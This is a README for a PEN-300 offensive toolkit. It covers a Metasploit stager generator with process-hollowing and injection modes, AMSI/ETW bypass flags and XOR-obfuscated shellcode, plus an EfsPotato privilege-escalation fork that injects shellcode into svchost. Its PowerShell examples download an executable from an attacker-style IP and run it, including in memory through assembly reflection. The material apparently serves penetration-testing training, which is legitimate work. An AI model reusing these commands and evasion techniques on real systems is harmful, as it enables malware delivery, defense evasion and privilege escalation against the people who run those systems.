# Tools for my PEN-300 course

* Update `LHOST` and `LPORT` in `ak.py` to your MSF (or other C2) listening IP and port before crafting any tools.
* By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
* Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.

## MSF Stager

```
usage: generate_win_msf_stager.py [-h]
                                  [--injection {hollow,interprocess,earlybird,standard}]
                                  [--format {exe,dll}]
                                  [--heuristics | --no-heuristics]
                                  [--amsi | --no-amsi] [--etw | --no-etw]
                                  [--stageless | --no-stageless]

optional arguments:
  -h, --help            show this help message and exit
  --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
  --format {exe,dll}, -f {exe,dll}
  --heuristics, --no-heuristics
  --amsi, --no-amsi
  --etw, --no-etw
  --stageless, --no-stageless
```

## Examples

```sh
# Create a dll that will use hollowing to load shellcode
python3 generate_win_msf_stager.py --injection hollow --format dll

# Create a stageless exe that will load and run shellcode within the same process
python3 generate_win_msf_stager.py --stageless --format exe
```

## EFSPotato Local Priv Escalation
The first argument passed to EfsPotato is ignored. It's normally used to specify a command to run, 
but this fork creates an svchost process and uses process hollowing to inject shellcode into the created
process.

The code is forked from https://github.com/zcgonvh/EfsPotato

### Standard Execution
```powershell
wget http://10.10.14.110/EfsPotato.exe -o C:\windows\tasks\EfsPotato.exe
C:\windows\tasks\EfsPotato.exe foo
```

### Using Assembly Reflection
```powershell
$u="http://10.10.14.110/EfsPotato.exe"
$b=(New-object system.net.webclient).DownloadData($u)
$a=[System.Reflection.Assembly]::Load($b)
[EfsPotato.Program]::Main("foo")
```
